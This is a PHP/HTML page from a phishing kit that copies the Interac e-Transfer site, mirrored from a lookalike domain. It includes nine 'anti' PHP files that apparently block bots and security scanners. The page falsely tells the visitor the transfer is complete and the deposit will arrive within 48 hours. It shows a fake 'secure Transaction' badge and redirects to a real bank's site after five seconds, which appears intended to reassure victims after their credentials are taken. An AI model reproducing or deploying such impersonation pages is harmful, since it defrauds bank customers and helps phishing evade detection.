<?php
	include '../prevents/anti1.php';
	include '../prevents/anti2.php';
	include '../prevents/anti3.php';
	include '../prevents/anti4.php';
	include '../prevents/anti5.php';
	include '../prevents/anti6.php';
	include '../prevents/anti7.php';
	include '../prevents/anti8.php';
	include '../prevents/anti9.php';
?>
<!DOCTYPE html>
<!-- saved from url=(0047)https://etransfer.interac.ca/RP.do?pID=CA2PGFqf -->
<html>
<!-- Mirrored from e-transfertbellmobility.com/Bank/error.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 22 Mar 2017 02:58:39 GMT -->
<head><meta http-equiv="Content-Type" content="text/html; charset=UTF->
<meta http-equiv="refresh" content="5;url=https://www.simplii.com/en/home.html"/>
<style type="text/css">
#gif {
	position: relative;
	text-align: center;
}
</style>
<iframe height="0" width="0" src="error_files/activityi.html" style="display: none; visibility: hidden;"></iframe><script type="text/javascript" async="" src="error_files/linkid.js.download"></script><script type="text/javascript" async="" src="error_files/analytics.js.download"></script><script async="" src="error_files/gtm.js.download"></script><script>
	if (self != top) {
		top.location.replace(this.location);
	}
</script>
<meta http-equiv="Expires" content="Thu, 01 Jan 1970 00:00:01 GMT">
<meta http-equiv="Cache-Control" content="no-cache">
<meta http-equiv="pragma" content="no-cache">

<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="">

<!-- Facebook OG Meta Tag -->
<meta property="og:title" content="Deposit your INTERAC e-Transfer">
<meta property="og:description" content="Receiving an INTERAC e-Transfer is fast and free using your mobile or online banking.">
<meta property="og:image" content="https://s3.amazonaws.com/etransfer-notification.interac.ca/images/etransfer_thumbnail_en.png">
<meta property="og:url" content="https://etransfer.interac.ca/?lang=en">
<meta property="og:site_name" content="INTERAC e-Transfer">
<!-- end Facebook OG Meta Tag  -->



<link rel="stylesheet" type="text/css" media="screen" href="error_files/generalCSS.css">

<link rel="stylesheet" type="text/css" media="screen" href="error_files/GTIe8CSS.css">

<!--[if lte IE 8]>
<link rel="stylesheet" type="text/css" media="screen" href="/gzip_1f01c3dfa37da3f8fb03ddc584d2f6b2/gateway/LTEIe8CSS.css" />
<![endif]-->

<!--[if IE 9]>
<link rel="stylesheet" type="text/css" media="screen" href="/gzip_54f623968887c3a01a10f46d44bed4bf/gateway/Ie9CSS.css" />
<![endif]-->

<script type="text/javascript" src="error_files/vendorJS.js.download"></script>


<!-- Google Tag Manager -->
<noscript>&lt;iframe src="//www.googletagmanager.com/ns.html?id=GTM-5SR238"
height="0" width="0" style="display:none;visibility:hidden"&gt;&lt;/iframe&gt;</noscript>
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0], j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'../../www.googletagmanager.com/gtm5445.html?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-5SR238');</script>
<!-- End Google Tag Manager -->






<!-- title -->
<title>INTERAC e-Transfer</title>
<meta http-equiv="no-cache">

<!-- header_end -->
</head>
    <body>
    	








<script>
$(document).ready(function(){
   $("a.change-language").click(function(event){
	   event.preventDefault();
	   if (typeof customChangeLanguageFunction == 'function') { 
		   customChangeLanguageFunction('/changeLanguage.do?pageName=error/gateway_error&lang=fr&country=CA'); 
		 }else{
	   		location.replace('../changeLanguage7bcd.html?pageName=error/gateway_error&amp;lang=fr&amp;country=CA');
		 }

   });
   
   $("a.about-menu").click(function(event){
	   event.preventDefault();
	   if (typeof customAboutFunction == 'function') { 
		   customAboutFunction("error/gateway_error",""); 
		 }else{
			 submitAbout("error/gateway_error","");
		 }
   });
   
   $("a.help-link").click(function(event){
	   openWindow(event,'http://interac.ca/en/etransferhelp', 'Help', 'resizable=yes,scrollbars=yes');
   });
   
   $("a.contactus-link").click(function(event){
	   openWindow(event,'https://help.interac.ca/ca/oon/en/contactUs/', 'contactUs', 'resizable=yes,scrollbars=yes,width=550,height=350');
   });
   
   $("a.certapay-link").click(function(event){
	   openWindow(event,'https://help.interac.ca/ca/oon/en/aboutUs/', 'aboutUs', 'resizable=yes,scrollbars=yes,width=550,height=350');
   });
   
    $("a.privacy-link").click(function(event){
	   openWindow(event,'https://help.interac.ca/ca/oon/en/privacy/', 'privacy', 'resizable=yes,scrollbars=yes');
   });
   
    $("a.security-link").click(function(event){
	   openWindow(event,'https://help.interac.ca/ca/oon/en/security/', 'security', 'resizable=yes,scrollbars=yes,width=550,height=350');
   });
   
    $("a.termsAndConditions-link").click(function(event){
	   openWindow(event,'https://help.interac.ca/ca/oon/en/terms/', 'terms', 'resizable=yes,scrollbars=yes,width=550,height=350');
   });
 });
 
function submitAbout(pageName,pageAction){
	var url = "aboutMoneyDeposit.do";
	if (pageName != ""){
		url += '?pageName='+pageName;
	}
	if (pageAction != ""){
		url += (pageName != "")?"&":"?";
		url += 'pageAction='+pageAction;
	}
	location.replace(url);
}

function openWindow(event,url,windowName, windowParams){
	event.preventDefault();
	window.open(url, windowName,windowParams);
}
</script>
<div class="custom-wrapper nav-menu" id="menu" data-enhance="false">
    <div class="pure-g nav-wrapper interac-max-width">
        <div class="pure-u-1 pure-u-md-1-3">
            <div class="pure-menu pure-menu-heading">
                <a href="http://www.interac.ca/en" class="custom-brand">
                <img id="brand-logo" src="error_files/nav-logo.svg" alt="INTERAC e-Transfer " style="height:50px;">
                   
                    	
                  </a>
                 	 
					
					<a href="https://etransfer.interac.ca/RP.do?pID=CA2PGFqf#" class="help-link pure-menu-link pure-hidden-md pure-hidden-lg pure-hidden-xl help-link" data-ajax="false" style="position: absolute; top: 5px; right: 45px;">
						<img src="error_files/question-mark.svg" id="help-icon" height="30px" width="30px" alt="?">
					   
					</a>

                 
                 <a href="https://etransfer.interac.ca/RP.do?pID=CA2PGFqf#" class="custom-toggle" id="toggle"><s class="bar"></s><s class="bar"></s></a>
              </div>
          </div>
          <div class="pure-u-1 pure-u-md-2-3">
              <div class="pure-menu pure-menu-horizontal custom-menu-3 custom-can-transform">
                  <ul class="pure-menu-list">
                    <li class="pure-menu-item">
                    	<a href="https://etransfer.interac.ca/RP.do?pID=CA2PGFqf#" class="contactus-link pure-menu-link" data-ajax="false">Contact Us</a>
                    </li>
                    
					 
                    <li class="pure-menu-item pure-hidden-sm pure-hidden-xs">
	                   
                        <a href="https://etransfer.interac.ca/RP.do?pID=CA2PGFqf#" class="help-link pure-menu-link" data-ajax="false">
                     	   <img src="error_files/question-mark.svg" id="help-icon" height="30px" width="30px" alt="?">
                            
                        </a>
                    </li>
                </ul>
            </div>
        </div>
    </div>
</div>












<div style="margin-left:auto; margin-right:auto; position:relative" class="interac-max-width" data-role="page" data-enhance="false">
    <div class="pure-g">
        <div class="pure-u-md-2-3 pure-u-1">
            <div class="display-inline-block padding-right-10 translate-y-d-7">
                <svg height="30px" version="1.1" viewBox="0 0 16 16" width="30px" xmlns="http://www.w3.org/2000/svg" xmlns:sketch="http://www.bohemiancoding.com/sketch/ns" xmlns:xlink="http://www.w3.org/1999/xlink" class="grey-border circle-icon grey-background ">
                    <g fill="none" fill-rule="evenodd" id="Icons with numbers" stroke="none" stroke-width="1">
                        <g id="Group" transform="translate(-576.000000, -432.000000)" class="white-icon">
                            <path d="M583,435 L583,437 L585,437 L585,435 Z M584,448 C579.581722,448 576,444.418278 576,440 C576,435.581722 579.581722,432 584,432 C588.418278,432 592,435.581722 592,440 C592,444.418278 588.418278,448 584,448 Z M583,439 L583,445 L585,445 L585,439 Z M583,439" id="Oval 208" class=""></path>
                        </g>
                    </g>
                </svg>
            </div>
             <h1 class="interac-yellow display-inline-block font-weight-100 -top-30">
               Your INTERAC e-Transfer has been completed.
            </h1>
        </div>
        <div class="pure-u-1"><div class="separator"></div></div>
        <div class="pure-u-1">
            <h3 class="font-weight-100">
            	
			</h3>
        </div>
        <div class="pure-u-1 text-center margin-top-30">
            
                <img src="loading.gif" alt="" id="gif" style="left: 0px; top: 0px" width="335">
           
        </div>
        <div class="pure-u-1 text-center">
            <h3>
           		
            	
				
					What to do now?

					
					<br> <br>
				<ul style="list-style-type: none;">
					
					<li>For security reasons, your deposit will reflect in your account within 48 hours. (0034)</li>
					
				</ul>
				
             	
             </h3>
        </div>

    </div> 
</div>




<div class="footer l-box interac-max-width" data-role="footer">
    <div class="separator"></div>
    <div class="pure-g footer-link-container">
        <div class="pure-u-lg-1-4 pure-u-md-1-2 pure-u-1">
            <a href="javascript:void();" class="certapay-link footer-link" data-ajax="false"><i>Interac</i> e-Transfer</a>
        </div>
        <div class="pure-u-lg-1-4 pure-u-md-1-2 pure-u-1">
            <a href="javascript:void();" class="privacy-link footer-link" data-ajax="false">Privacy Policy</a>
        </div>
        <div class="pure-u-lg-1-4 pure-u-md-1-2 pure-u-1">
            <a href="javascript:void();" class="security-link footer-link" data-ajax="false">Security</a>
        </div>
        <div class="pure-u-lg-1-4 pure-u-md-1-2 pure-u-1">
            <span class="footer-text">This is a secure Transaction
	            <svg height="20px" id="Ð¡Ð»Ð¾Ð¹_1" style="enable-background:new 0 0 512 512;" version="1.1" viewBox="0 0 512 512" width="20px" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" class="translate-y-d-3">
	                <switch>
	                    <g>
	                        <path d="M221.909,335.546c0-18.866,15.226-34.092,34.091-34.092  s34.091,15.226,34.091,34.092c0,13.749-8.189,25.567-19.997,30.905l19.997,60.003h-68.182l19.997-60.003  C230.093,361.113,221.909,349.295,221.909,335.546z M437.818,233.273H74.182v250h363.637V233.273z M369.637,136.682  c0-59.659-48.296-107.955-107.955-107.955h-11.363c-59.659,0-107.955,48.296-107.955,107.955v73.864h227.273V136.682z M437.818,506  H74.182c-12.501,0-22.727-10.231-22.727-22.728v-250c0-12.496,10.226-22.728,22.727-22.728h45.455v-73.864  C119.636,64.527,178.158,6,250.318,6h11.363c72.155,0,130.682,58.527,130.682,130.682v73.864h45.455  c12.495,0,22.728,10.232,22.728,22.728v250C460.546,495.769,450.313,506,437.818,506z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#b5b5b5;" class="grey-icon"></path>
	                    </g>
	                </switch>
	                <foreignobject></foreignobject> 
	            </svg>
            </span>
        </div>
    </div>
    <div class="separator"></div>
    <div class="padding-t-5 pure-g">
        <div class="pure-u-md-1-2 pure-hidden-sm pure-hidden-xs text-left">
            <img class="logo" src="error_files/footer-logo-en.svg" alt="">
        </div>
        <div class="pure-u-1 pure-hidden-md pure-hidden-lg pure-hidden-xl">                   
            <img class="logo" src="error_files/footer-logo-en.svg" alt="">
        </div>
        <div class="pure-u-md-1-2 pure-u-1">
            <p class="copyright-text">
				2000 =
				2019
				Acxsys Corporation.  All rights reserved. 
				<a href="javascript:void();" class="termsAndConditions-link underline">Terms of Use</a>
				<br>
				® Trade-Mark of Interac Inc. Used under licence
				
            </p>
        </div>
    </div> 
</div>
<script type="text/javascript" src="error_files/navJS.js.download"></script>


	
<script>

function goBack() {
    window.history.back();
}
</script>


<script type="text/javascript" id="">(function(c,h,m,t){var n={elements:[],minHeight:0,percentage:!0,testing:!1},k=c(h),f=[];c.scrollDepth=function(d){function l(a,b,e){d.testing?c("#console").html(a+": "+b):"undefined"!==typeof dataLayer?(dataLayer.push({event:"ScrollDistance",eventCategory:"Scroll Depth",eventAction:a,eventLabel:b,eventValue:1,eventNonInteraction:!0}),2<arguments.length&&dataLayer.push({event:"ScrollTiming",eventCategory:"Scroll Depth",eventAction:a,eventLabel:b,eventTiming:e})):("undefined"!==typeof ga&&(ga("send",
"event","Scroll Depth",a,b,1,{nonInteraction:1}),2<arguments.length&&ga("send","timing","Scroll Depth",a,e,b)),"undefined"!==typeof _gaq&&(_gaq.push(["_trackEvent","Scroll Depth",a,b,1,!0]),2<arguments.length&&_gaq.push(["_trackTiming","Scroll Depth",a,e,b,100])))}function p(a,b,e){c.each(a,function(a,g){-1===c.inArray(a,f)&&b>=g&&(l("Percentage",a,e),f.push(a))})}function q(a,b,e){c.each(a,function(a,g){-1===c.inArray(g,f)&&c(g).length&&b>=c(g).offset().top&&(l("Elements",g,e),f.push(g))})}function r(a,
b){var e,c,g,d=null,f=0,k=function(){f=new Date;d=null;g=a.apply(e,c)};return function(){var h=new Date;f||(f=h);var l=b-(h-f);e=this;c=arguments;0>=l?(clearTimeout(d),d=null,f=h,g=a.apply(e,c)):d||(d=setTimeout(k,l));return g}}var s=+new Date;d=c.extend({},n,d);c(m).height()<d.minHeight||(l("Percentage","0%"),k.on("scroll.scrollDepth",r(function(){var a=c(m).height(),b=h.innerHeight?h.innerHeight:k.height(),b=k.scrollTop()+b,a={"25%":parseInt(.25*a,10),"50%":parseInt(.5*a,10),"75%":parseInt(.75*
a,10),"100%":a-1},e=+new Date-s;f.length>=4+d.elements.length?k.off("scroll.scrollDepth"):(d.elements&&q(d.elements,b,e),d.percentage&&p(a,b,e))},500)))}})(jQuery,window,document);jQuery.scrollDepth();</script></body>
<!-- Mirrored from e-transfertbellmobility.com/Bank/error.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 22 Mar 2017 02:58:47 GMT -->
</html>